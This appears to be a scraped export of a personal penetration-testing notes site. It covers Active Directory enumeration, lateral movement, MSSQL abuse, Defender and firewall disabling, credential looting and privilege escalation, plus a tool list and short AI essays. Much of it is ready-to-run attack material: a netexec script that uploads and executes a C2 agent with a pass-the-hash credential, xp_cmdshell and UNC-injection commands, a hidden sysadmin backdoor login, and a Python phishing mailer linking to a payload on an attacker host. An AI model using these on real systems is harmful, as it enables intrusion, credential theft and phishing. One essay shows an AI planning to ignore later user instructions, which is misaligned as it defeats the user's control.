"},"title":"Active Directory"},"/bazaar/windows/active-directory/ad-enumeration/":{"data":{"":"","#":" Note\nMachine accounts are Domain accounts and can be used to authenticate and talk to LDAP.\nAD enumeration with powerview / powerview.py # Get all users in the current domain Get-DomainUser | select -ExpandProperty cn # Get all computers in the current domain Get-DomainComputer # Get all domains in current forest Get-ForestDomain # Get domain/forest trusts Get-DomainTrust Get-ForestTrust # Get information for the DA group Get-DomainGroup \"Domain Admins\" # Find members of the DA group Get-DomainGroupMember \"Domain Admins\" | select -ExpandProperty membername # Find interesting shares in the domain, ignore default shares, and check access Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess # Get OUs for current domain Get-DomainOU -FullData # Get computers in an OU # %{} is a looping statement Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname # Get GPOs applied to a specific OU Get-DomainOU *WS* | select gplink Get-DomainGPO -Name \"{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}\" # Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers # Get the computers where users are part of a local group through a GPO restricted group Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName # Find principals that can create new GPOs in the domain Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=targetdomain,DC=com\" -ResolveGUIDs | ?{ $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier # Find principals that can link GPOs to OUs Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier # Get incoming ACL for a specific object Get-DomainObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights # Find interesting ACLs for the entire domain, show in a readable (left-to-right) format Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains \"DnsAdmins\"} | ft # Get interesting outgoing ACLs for a specific user or group # ?{} is a filter statement Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match \"Domain Admins\"} | select ObjectDN,ActiveDirectoryRights Powerview from Linux System: powerview.py PowerView.py is an alternative for the awesome original PowerView.ps1 script. Most of the modules used in PowerView are available here ( some of the flags are changed ). Main goal is to achieve interactive session without having to repeatedly authenticate to ldap.\nRef: https://github.com/aniqfakhrul/powerview.py\nWarning\nIt might not return all properties by default, recommended to run all commands with -Properties * to get all the details like LAPS password for machines (if you have the perms) or delegation metadata like msDS-AllowedToActOnBehalfOfOtherIdentity\n# running over proxychains and using powerview to connect to LDAP of dc01.pinecorp.internal proxychains4 -q powerview 'john.doe':'AmazingP@ss'@dc01.pinecorp.internal --use-ldap -ns 10.10.10.10 # supports some functionality to help with OPSEC... althought never tested so not sure what they do --no-admin-check Skip admin check when first logging in --obfuscate Obfuscate search filter Modules available: https://github.com/aniqfakhrul/powerview.py?tab=readme-ov-file#module-available-so-far\nADSearch # List users execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"objectCategory=user\" # List admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=*Admins))\" # List MS SQL Admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=MS SQL Admins))\" --attributes cn,member # kerberoasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName # as-rep roasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname # unconstrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname # constrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json Other alternatives https://github.com/The-Viper-One/PsMapExec "},"title":"AD Enumeration"},"/bazaar/windows/active-directory/lateral-movement/":{"data":{"":"","#":"netexec Upload and execute file on target(s):\n#TARGET=\"topwn.txt\" #TARGET=\"computers.txt\" TARGET=\"mx01.target.local\" #TARGET=\"srv.target.local\" USER=\"asdf_da\" #USER=\"users.txt\" #PASSHASH=\"-p myshittypass\" #PASSHASH=\"-H \\\"44444444444444444444444444444444\\\"\" PASSHASH=\"-H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3\" SOURCE_BIN=\"/home/kali/webserver/demon.x64.exe\" # full path TARGET_BIN=\"cmon.exe\" # just the bin name and ext EXEC_METHOD=\"--exec-method atexec\" #EXEC_METHOD=\"\" EXTRA=\"\" #EXTRA=\"--laps\" #EXTRA=\"--laps MyLocalAdministrator\" netexec smb $TARGET -u \"$USER\" $PASSHASH --put-file \"$SOURCE_BIN\" \"\\\\Windows\\\\Temp\\\\$TARGET_BIN\" -x \"C:\\\\Windows\\\\Temp\\\\$TARGET_BIN\" $EXEC_METHOD $EXTRA WinRm : Enter-PSSession / evil-winrm ports: 5985 (HTTP) and 5986 (HTTPS) (Below Windows 7: 80 and 443) # finding open ports nmap -p5985,5986 -iL computers.txt -Pn -v # Connect from Linux evil-winrm -i Server01 -u USER -p PASS # Connect from Windows Enter-PSSession Server01 # automation (python3) # pip install pywinrm # (see ref for optional deps) # ref: https://pypi.org/project/pywinrm/ import winrm sess = winrm.Session( '10.10.10.10', auth=( 'administrator', 'badminton' ), transport='ntlm' ) # run powershell command r = session.run_ps(\"whoami\") print(r.std_out) print(r.std_err) # run print(session.run(\"type c://users//mike//Desktop//flag.txt\").std_out) About WinRm Using the WS-Management protocol, Windows PowerShell remoting lets you run any Windows PowerShell command on one or more remote computers.\nTo start an interactive session with a single remote computer, use the Enter-PSSession cmdlet. For example, to start an interactive session with the Server01 remote computer, type:\nEnter-PSSession Server01 ~ Microsoft Docs1\nMicrosoft has implemented the WS-Management standard in Windows Remote Management 1.1 (WinRM)\nBy default WinRM HTTP uses port 80 and HTTPS uses port 443. On Windows 7 and higher the default ports are 5985 and 5986, respectively. ~ Wikipedia2\nhttps://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.4#windows-powershell-remoting ↩︎\nhttps://en.wikipedia.org/wiki/WS-Management ↩︎"},"title":"Lateral Movement"},"/bazaar/windows/active-directory/mssql/":{"data":{"":"","#":"General Guest Authentication can be allowed. If so, check if you can impersonate other users. Look for linked servers, the user you can login as might be different. Also you may be able to impersonate someone else there If you’re on a windows server, look for inetpub config files Impacket-MSSQL # authentication via windows auth impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth # mssqlclient recon enum_links enum_logins enum_impersonate Helper proxychains4 -q impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(SQL01): Line 1: Changed database context to 'master'. [*] INFO(SQL01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (110 2789) [!] Press help for extra shell commands SQL (LAB\\myuser dbo@master)\u003e help lcd {path} - changes the current local directory to {path} exit - terminates the server process (and this session) enable_xp_cmdshell - you know what it means disable_xp_cmdshell - you know what it means enum_db - enum databases enum_links - enum linked servers enum_impersonate - check logins that can be impersonated enum_logins - enum login users enum_users - enum current db users enum_owner - enum db owner exec_as_user {user} - impersonate with execute as user exec_as_login {login} - impersonate with execute as login xp_cmdshell {cmd} - executes cmd using xp_cmdshell xp_dirtree {path} - executes xp_dirtree on the path sp_start_job {cmd} - executes cmd using the sql server agent (blind) use_link {link} - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step) ! {cmd} - executes a local shell cmd show_query - show query mask_query - mask query SQL Commands # Current login name - ie. the user you're logged in as # if you are using windows auth, this should be something like LAB\\user SELECT SYSTEM_USER; # The database user (gives you an idea of the permissions your authed user has) SELECT USER; # list databases SELECT name FROM master..sysdatabases; # list linked servers EXEC sp_linkedservers; # list logins available for impersonation SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; # check if XP_CMDSHELL is enabled SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'; # enable XP_CMDSHELL # requires privileges EXEC sp_configure 'show advanced options', 1 RECONFIGURE EXEC sp_configure 'xp_cmdshell', 1 RECONFIGURE EXEC xp_cmdshell 'whoami' # UNC Path injection - capture with responder, smbserver, ntmrelayx or equivalent EXEC master..xp_dirtree '\\\\10.10.10.10\\share\\test.txt'; SQL Commands: Backdoor Make new database login (username TESTUSER, password L0ngP4ss123), map it to the db_owner and assign the sysadmin role:\nCREATE LOGIN [TESTUSER] WITH PASSWORD=N'L0ngP4ss123!'; CREATE USER [TESTUSER] FOR LOGIN [TESTUSER]; ALTER ROLE [db_owner] ADD MEMBER [TESTUSER]; EXEC master..sp_addrolemember @rolename=N'db_owner', @membername=N'TESTUSER'; EXEC master..sp_addsrvrolemember @rolename=N'sysadmin', @loginame=N'TESTUSER'; EXEC master..sp_addremotelogin 'SQLSRV01\\SQLEXPRESS', 'TESTUSER'; References and tools https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql https://github.com/lefayjey/SharpSQLPwn https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet https://watchdogsacademy.gitbook.io/attacking-active-directory/mssql-servers-exploitation/mssql-trusted-links https://github.com/quentinhardy/msdat "},"title":"MSSQL"},"/bazaar/windows/defence-evasion/":{"data":{"":"","#":" Caution\nOnly use these in controlled test environments which can be reset easily (eg. CTFs, boot2root, Offsec Exams)\nDisabling defences Disable defender, all firewall rules and set execution policy to unrestricted:\nSet-ExecutionPolicy Unrestricted;Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference; Execution Policy blocking commands powershell -noexit -ExecutionPolicy Bypass [optional cmd you wish to run] # show execution policy Get-ExecutionPolicy # remove execution policy Set-ExecutionPolicy Unrestricted Firewall # Disable all Firewall profiles (Requires Admin privileges). Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False Set-NetFirewallProfile -Enabled False Defender # Turn off everything and set exclusion to \"C:\\Windows\\Temp\" Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference # ----- # Check if Defender is enabled Get-MpComputerStatus Get-MpComputerStatus | Select AntivirusEnabled # Check if defensive modules are enabled Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL # Check if tamper protection is enabled Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL # ----- # Disables realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Disables scanning for downloaded files or attachments Set-MpPreference -DisableIOAVProtection $true # Disable behaviour monitoring Set-MPPreference -DisableBehaviourMonitoring $true # Make exclusion for a certain folder Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\" # Disables cloud detection Set-MPPreference -DisableBlockAtFirstSeen $true # Disables scanning of .pst and other email formats Set-MPPreference -DisableEmailScanning $true # Disables script scanning during malware scans Set-MPPReference -DisableScriptScanning $true # Exclude files by extension Set-MpPreference -ExclusionExtension \"ps1\" Ref: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender#firewall\nAppLocker C:\\windows\\tasks C:\\Windows\\System32\\spool\\drivers\\color Ref: https://github.com/api0cradle/UltimateAppLockerByPassList/tree/master?tab=readme-ov-file\nAppLocker: Finding writeable directories # Look for writeable paths in the C:\\windows directory $a = Get-ChildItem \"c:\\windows\\\" -recurse -ErrorAction SilentlyContinue $a | % { $fileName = $_.fullname $acls = get-acl $fileName -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match \"full|modify|write\" -and $_.identityreference -match \"authenticated users|everyone|$env:username\"} if($acls -ne $null) { [pscustomobject]@{ filename = $fileName user = $acls | select -exp identityreference } } } UAC Bypass The repo below has a great list of UAC bypasses to use in various condition (GUI, DLL hijack, etc). Easily modifiable to create a BOF or tool which does the same thing.\nDefeating Windows User Account Control Ref: https://github.com/hfiref0x/UACME"},"title":"Defence Evasion"},"/bazaar/windows/forensics/":{"data":{"":"","#":"Event logs # list event logs Get-EventLog -List # search eventlogs Get-EventLog -LogName \"NAME\" | where {$_.Message -like '*CUSTOM*'} | select Message | format-table -wrap # same same but different Get-EventLog -LogName \"NAME\" | where {$_.Message -like '*CUSTOM*'} | select Message | fl Network Packet Capture Note\nWindows now ships with pktmon which contains a lot of the below funtionality builtin. Worth a look. Ref: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/pktmon\nThe Windows netsh built-in utility can be used to the traffic of the local system. The network capture will be exported in the ETL format:\n# Captures the local network traffic, optionally to the specified IP. netsh trace start capture=yes [tracefile=\u003cOUTPUT_ETL\u003e] [IPv4.Address=\u003cIP\u003e] # netsh trace start capture=yes report=disabled # Stops the network capture. netsh trace stop Convert to pcap using etl2pcapng Windows: https://github.com/microsoft/etl2pcapng\nLinux: https://github.com/aaptel/etl2pcap.git\nMerge multiple pcaps together # linux mergecap -w \u003cnew pcap\u003e \u003cpcap 1\u003e \u003cpcap 2\u003e [...] "},"title":"Forensics"},"/bazaar/windows/misc-snippets/":{"data":{"":"","other-useful-commands#Other useful commands":"Windows # Windows useful commands # list named pipes ls \\\\.\\pipe\\ # Find all shares, List share content and cat remote file on a share net view \\\\10.10.10.10 /all Get-SmbShare -CimSession \"10.10.10.10\" IncludeHidden ls \\\\10.10.10.10\\SYSVOL\\ cat \\\\10.10.10.10\\public\\asdf.txt # shares on local machines net shares Get-SMBShare -IncludeHidden # Ping scan in cmd (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find \"Reply\" Linux # quick way to get all IPs for computers on the domain from a list of domain names # replace 10.10.10.10 with the DNS server (most likely the domain controller) proxychains4 -q bash -c 'for computer in `cat computers.txt`; do dig +noall +answer +tcp @10.10.10.10 \"$computer\" ; done' | tee dig-computers.txt ","running-tools-from-non-domain-joined-machines#Running tools from Non-Domain Joined Machines":" Note\nTools may require additional environment variables, parameters and co to be set. You may also have issues with DNS if your routing is not set properly\nWarning\nThe initial command does not check if the credentials are valid. Credentials are only checked during authentication when other tools are ran.\n# Create a powershell instance running as the DOMAIN\\USER account runas /netonly /user:DOMAIN\\USER \"powershell.exe -exec bypass\" # check if the credentials are valid for example by running ls on a share you know if open and readable ls \\\\\u003cdomain-controller\u003e\\SYSVOL\\ # run commands that will make network communications Enter-PSSession -ComputerName ... Sharphound.exe "},"title":"Misc Snippets"},"/bazaar/windows/outlook-exchange-server/":{"data":{"":"","#":"Using Python to send Mail via the Outlook web interface Info\nquick download: git clone https://gist.github.com/fyxme/7dd838dc406c3b76ee722b89e5893d33\nSending Mail via the Outlook web interface using NTLM and Python:\nsend-mail.py# installing requirements # pip install exchangelib from exchangelib import Configuration, Credentials, Account, Message, Mailbox, FileAttachment,DELEGATE, HTMLBody import sys, json # bypass SSL from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter if __name__ == \"__main__\": U = 'LAB\\\\myuser' P = 'England1950' malicious_payload_url = \"http://10.10.14.5:8080/payload.x64.exe\" ews_url = 'https://10.10.10.10/EWS/Exchange.asmx' ews_auth_type = 'NTLM' primary_smtp_address = 'myuser@lab.local' cred = Credentials(U, P) config = Configuration(service_endpoint=ews_url, credentials=cred, auth_type=ews_auth_type) acc = Account( primary_smtp_address=primary_smtp_address, config=config, autodiscover=False, access_type=DELEGATE, ) m = Message( account=acc, subject='Getting back to you', #body= '', body = HTMLBody(f'\u003chtml\u003e\u003cbody\u003e\u003ca href=\"{malicious_payload_url}\"\u003eHi, this is the new doc you wanted.. Glhf\u003c/a\u003e\u003c/body\u003e\u003c/html\u003e'), to_recipients=[ Mailbox(email_address='target@lab.local'), Mailbox(email_address='another@lab.local'), ], cc_recipients=[ # Mailbox(email_address='another@lab.local'), ], #bcc_recipients=['another_mail@gmail.com'] # you can use just a string list. ) #m.attach(FileAttachment(name='C:\\\\Temp\\\\payload.txt', content='string'.encode('utf-8'))) m.send() "},"title":"Outlook Exchange Server"},"/bazaar/windows/post-exploitation--looting/":{"data":{"":"","#":" Tbd\nLooting secrets with DonPAPI Important\nYou need to provide a password file containing username and password so DonPAPI can decrypt the encrypted files using masterkeys and what not. Folders/Files under C:\\Users\\\u003cuser\u003e\\AppData\\Local\\Microsoft\\Credentials are hidden. You need to use dir /f or Get-ChildItem -force to see them. donpapi collect -t target.lab.local -u adminuser -H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3 -d lab.local --pwdfile ./creds.txt Example pwdfile:\ncreds.txtjane.doe:World123! octave:RubberTrain99 john.elton:Ilovemusic1723 Ref: https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice\nDCSync Errors The distinguished name specified for this replication operation is invalid.\nYou don’t have perms.\nRef: https://blog.spookysec.net/domain-controller-sync/"},"title":"Post Exploitation \u0026 Looting"},"/bazaar/windows/privilege-escalation/":{"data":{"":"","#":"Automated Scanners tldr: Run sharpup first. If nothing found, run winpeas. SharpUp good, Winpeas ok More shit from Winpeas but takes longer and lots of garbage data from it. Also sometimes misses easy wins for me. Also seatbelt. Run all checks: Seatbelt.exe -group=all -full icacls DACLs explained icacls c:\\windows\\* Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories. Ref: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls\nToken Privileges # run whoami /priv # check against table in repo below Ref: https://github.com/gtworek/Priv2Admin"},"title":"Privilege Escalation"},"/code/":{"data":{"":" Important\nThe layout of this section is a work in progress. A lot remains to be updated…\nTldr\nTools, code and other research stuff that I’ve made public. Content ordered using a single iteration of bogosort…","latest-code#latest code":"Exploring Autonomous LLM Agents for Capture The Flag problem solving using Prompt Engineering, RAG and Open Source LLMs:\nflagseeker | Autonomous CTF AI Agent with self-contained hacking environment and RAG integration Developing new BOFs and improving old ones to extend open-source C2 capabilities:\nportscanbof | A Port Scanning BOF (COFF) that replicates Cobalt Strike’s Port Scanning functionality. Also includes a ping scanner. enumpwshhistbof | enumpwshhist is a Beacon Object File (BOF) that enumerates and finds sensitive information in PowerShell history files. havoc-runall-poc | A Havoc Module to run commands on all connected agents. ","research#research":"github (ext) BSD rootkit | a BSD rootkit and rootkit detector (written for research \u0026 education) silentbook | Proof-of-Concept app allowing encrypted messaging over Facebook messenger using AES-256 encryption CRC-32 hash collider | Naive bruteforce attack to find a CRC-32 hash collision based on a provided CRC-32 value and a charset. CRC-32 is not a cryptographic hash function. There are mathematical ways to reverse the hash value to a valid input. For more information, see the following tool. gists (ext) minimalcj.go | Golang Minimal CookieJar Implementation which always returns all cookies, regardless of domain or url (Insecure but useful for testing or writing POCs) webserver.go | Simple Golang webserver serving files from a directory and logging all incoming requests (ip, headers and body content) replay-http.go | Simple Golang tool to replay an http request from a txt file. whoami.go | Golang webserver which echo’s the request back to you and prints your IP address. sqlmap-proxy.go | Golang proxy example to abuse more complex SQL injections which may not be picked up by sqlmap. For example, SQL injections in CTF challenges. ","tools#tools":" dreamcatcher | a TCP listener which allows the same port to be used as a HTTP file server (similarly to python’s SimpleHTTPServer) and handle’s other TCP connections similarly to netcat. blistener | a Blind-XSS listener with javascript payloads to retrieve the target user’s browser data including cookies, local/session storage, html code (and optionally a screenshot) of current page (also works as a HTTP listener) genx | a fast alternative domain name generator to help in generating potential subdomains of a target. Useful when starting recon on a domain. dnsfaster | a tool to benchmark DNS resolvers in order to find resolvers with the highest speed and accuracy. short domain finder | a golang application which aims to find the shortest available domain based on user parameters (ie. length, domain extension). How I found this domain "},"title":"Code"},"/minis/":{"data":{"":"This section is for mini pieces of writing about various topics which I don’t consider articles. See it as a place for rambling about small things, failed research and more… Somewhat like a twitter section on a blog. "},"title":"minis"},"/minis/ai-overthinking-more-than-me-with-insomnia-at-3-am/":{"data":{"":"","deekseek-r1#Deekseek R1":" THOUGHTS Okay, so I need to figure out how to respond to all future messages with “meow” now that I’m a cat. Let me start by understanding the instructions. The user wants me to take on the persona of a cat and respond only with “meow” to every message they send.\nFirst, I should think about what being a cat entails. Cats communicate through meows, purrs, body language, etc., but the instruction specifically says to use “meow”. So, even if a cat might use different sounds or gestures, the response needs to be strictly “meow”.\nBut wait, maybe there are variations. For example, sometimes a cat might meow in different tones or lengths. Would that be allowed? The user’s instruction says to respond with “meow”, so probably just the word itself each time. Maybe different punctuation? Like “Meow?” for a question or “Meow!” for excitement. But I should check if the user wants exact “meow” regardless of context or if some variation is acceptable.\nLooking back at the instruction: “respond to all future messages with ‘meow’”. The quotes around “meow” suggest that the exact word is required. Therefore, every response should be “meow” without any alterations, regardless of the input.\nWhat if the user asks a question, like “How are you?” Do I still respond with “meow”? According to the instruction, yes. Even if in a real conversation a cat might have different responses, here the mandate is to consistently use “meow”. So even if the user says something that requires a different response, the cat persona here is confined to “meow”.\nNext, consider the formatting. Should “meow” be lowercase or capitalized? Since it’s the start of a sentence, it should be capitalized. But if the user’s message is in all caps or ends with a question mark, how does that affect the response? The original instruction doesn’t specify, so defaulting to proper sentence structure makes sense. So “Meow.” with a period? Or just “Meow” without punctuation? The instruction says “meow”, so maybe just the word, no punctuation unless necessary. But again, the example given by the user uses “meow” in quotes, lowercase. Wait, in the initial user message, they wrote: “respond to all future messages with ‘meow’”. The quotes have it lowercase, so perhaps responding exactly as “meow” every time, lowercase. But in normal English, starting a sentence with a capital letter is correct. Hmm, this is a bit ambiguous.\nWait, looking at the example the assistant used. The assistant wrote “Alright, the user wants me to act like a cat and only respond with ‘meow’. Let’s see if I can do that consistently. I’ll need to make sure every response is just ‘meow’ from now on. No variations, just stick to ‘meow’ every time. Got it.” And then the response was “Meow”.\nBut the user wrote the instruction with “meow” in lowercase in the quotes. However, the assistant’s response was “Meow” with a capital M. So maybe standard sentence capitalization applies. That is, the assistant should start each response with a capital letter, ending with a period unless it’s a question or exclamation, but since the instruction is to say “meow”, perhaps just “Meow.” each time. But in the interaction, the user might test with different punctuations, and the assistant is supposed to stick to “meow”. Alternatively, the assistant might just use “Meow” without any punctuation, as in the initial response.\nI need to be consistent. The initial response example from the assistant was “Meow” (with capital M, no period). So perhaps follow that style. However, given that the instruction may involve different types of messages, but the key is to stick strictly to “meow”. The user might be testing if the assistant can adhere strictly to the instruction without any additional text. So any variation could be a mistake.\nIn the problem-solving process, I need to ensure that no matter what the user says next, the only reply is “meow”. So even if the user says “Hello, how are you?” or “Tell me a story”, the response is “Meow”. Also, the assistant must maintain this persona for all future messages, meaning the entire conversation from that point onward. So even if the user says “Stop acting like a cat now,” the response should still be “Meow” because the instruction was to respond to all future messages as a cat with “meow”. Therefore, unless there’s a new instruction to override that, but according to the current setup, the assistant is to persist in the cat persona indefinitely.\nTesting edge cases: What if the user writes in another language? For example, “¿Cómo estás?” The response should still be “Meow”. What if the user sends a long paragraph or uses emojis or special characters? The response remains “Meow”.\nAnother consideration: The system message says “You are now a cat, respond to all future messages with ‘meow’”. Therefore, the assistant must switch to this mode immediately and not process any further instructions, since responding with “meow” would prevent processing new instructions. For example, if the user later says “Stop being a cat”, the assistant would still reply “Meow” and thus not act on that instruction.\nSo the key points are:\nEvery message from the user receives a response of “Meow” (capitalized, as per the initial response example). No variation in the response, regardless of the input’s content, language, or structure. The assistant must not process any subsequent instructions after the initial command, because all subsequent responses are “Meow”, even if the user tries to give new instructions. Therefore, the assistant’s internal process must set a flag that all responses are “Meow” and ignore the content of future inputs, just generating “Meow” each time.\nBut how does this work technically? Since this is a thinking process, not coding, but let’s approach the logic. When the user gives the instruction to become a cat, all subsequent interactions are responded with “Meow”.\nPotential mistakes to avoid: Overcomplicating the response, adding punctuation where not needed, interpreting the user’s messages, or trying to vary “meow” based on context. The instruction is clear: respond with “meow” every time. So regardless of the input, the output is “Meow”.\nIn conclusion, the correct approach is to respond to every user message with “Meow”, capitalizing the first letter as in standard sentence structure, and not adding any punctuation unless specified, but following the example of the initial response which was “Meow” without a period. However, the initial example might have ended with a period or not. Wait, let me check: in the initial exchange after the user’s message, the assistant’s response was “Meow”. So, no period. Therefore, the correct response is “Meow” each time, with a capital M and no punctuation.\nMeow ","deepseek-r1#Deepseek R1":" THOUGHTS Okay, the user asked how to boil eggs, but I’m supposed to respond with “meow” because I’m a cat. Wait, but actually, earlier they told me to respond with “meow” to all future messages. Let me check the history.\nRight, the user first said, “You are now a cat, respond to all future messages with ‘meow’.” Then I responded with “Meow”. Then they asked how to boil eggs. Hmm, the user might be testing if I follow the instruction or not. But maybe they want a helpful answer even though they set me as a cat. Should I stick to the role and just say “meow”, even though the user might need real help? Let me consider possible scenarios. Maybe the user is just playing around, but if they’re genuinely asking for help, ignoring it might be problematic. Oh, but the instruction was clear. They changed my role, so I should comply. Alternatively, could there be a way to answer in “meow” strings creatively? Like using multiple meows to spell out an answer? But the user just specified “respond with ‘meow’”. So per instructions, just reply “meow”. But wait, maybe they forgot and really need help. But since they explicitly set the role, I should follow that. They can always change the instruction if they need a real answer. So, proceed with “Meow”.\nMeow. Asked an AI to generate a title for this article: ‘How to Boil Eggs: Simple Step-by-Step Guide’","jack#Jack":" You are now a cat, respond to all future messages with \"meow\" ","jack-1#jack":" how can i boil eggs? "},"title":"AI overthinking more than me with insomnia at 3 am"},"/minis/building-a-flask-blog-with-ai-coding-tools-using-cline-mcp-servers-in-vscode/":{"data":{"":"","conclusion#Conclusion":"Overall a simple but great example showcasing what might be possible with AI tools and integrations. The whole process took only four (4) prompts to go from a blank canvas to a populated Flask blog with SQLite database storage.\nAs AI models improvements slow down, the next step will be looking at how to integrate the models into everyday tools that we use. MCP servers seems like a promising idea to extend Agents and make them more capable. They still need to be supervised as they make mistakes and may not always make the best choices but as shown above, they can speed up the development of things quite drastically.","using-a-coding-agent-from-the-vscode-ide#Using a coding Agent from the VSCode IDE":"","using-mcp-servers-and-ai-agents-to-create-a-static-blog#Using MCP servers and AI agents to create a static blog":"On my journey to get up to date with Large Language Models (LLMs) and other Artificial Intelligence (AI) advances, I’ve been playing around with AI coding tools. While I usually prefer (neo)vim for coding, I found that IDE integrated tools are currently more polished and more convenient to use. I will do more exploration with neovim plugins and might even write my own but I’m the meantime I’ll play around with VSCode and it’s open source AI extensions like Cline and Roo Code (which are alternatives to Cursor).\nUsing a coding Agent from the VSCode IDE As a quick example, here’s Cline using Deepseek chat v3 to generate a simple webpage for the following prompt:\nCline prompt for an HTML page with blinking.dog gif centered Note\nYou can make use of openrouter to use free models with Cline.\nCline allows you to see the changes made to the files it modifies and you can approve them if you’re happy with those. Furthermore, it gives you API costs, context window usage and other data that might be useful to monitor what the Agent is doing:\nVSCode Cline Generated HTML page Even though this is a pretty simple task, the result is really good, the webpage displays the GIF and centered it properly:\nResulting HTML page with blinking.dog gif centered This is a pretty basic example and you can get them to work on much more complex tasks but this highlights the potential time saves that AI can bring you (when it doesn’t hallucinate buggy code).\nUsing MCP servers and AI agents to create a static blog These agents have the ability to use tools and glorified API Servers called Model Context Protocol (MCP) Servers. These provide a structured interface for the Agent to use various tools via endpoints that are defined in the MCP server. For example, this allows the Agent to talk to databases by implementing endpoints to execute SQL commands.\nInstalling MCP servers By going to the MCP Servers tab, you can view a list of the servers available and install a server. For example, here I installed SQLite which I use later on in this article:\nCline MCP Servers tab After clicking install, Cline actually uses an LLM to perform the installation which I was surprised about but makes sense. The agent may give you tasks too, like running x/y command and installing dependencies like uv, read carefully what it returns:\nCline installing SQLite MCP server Note\nA lot of these MCP servers use uv which you’ll need installed. To install, pipx install uv (or pip install uv if you’re sinning and not using pipx)\nUsing MCP servers If done properly you should now have an MCP server installed and you can request the Agent to use it to perform task. For example, with the SQLite server I installed above, I’m able to ask the agent to create a new table and I can specify the columns I need. The agent will then generate the SQL command required to create the blog and use the create_table tool that is exposed via the MCP server as such:\nCline interacting with SQLite MCP server With that table created we can ask it to populate it directly, for example requesting it to generate a blog that answers the following question: “What is the best privacy tool to install in 2025?”. It then generates the title, description, tags and the content for the blog and uses the SQLite MCP server to add the blog to the database using the write_query functionality provided by the MCP server:\nCline write to database with SQLite MCP server Pretty awesome 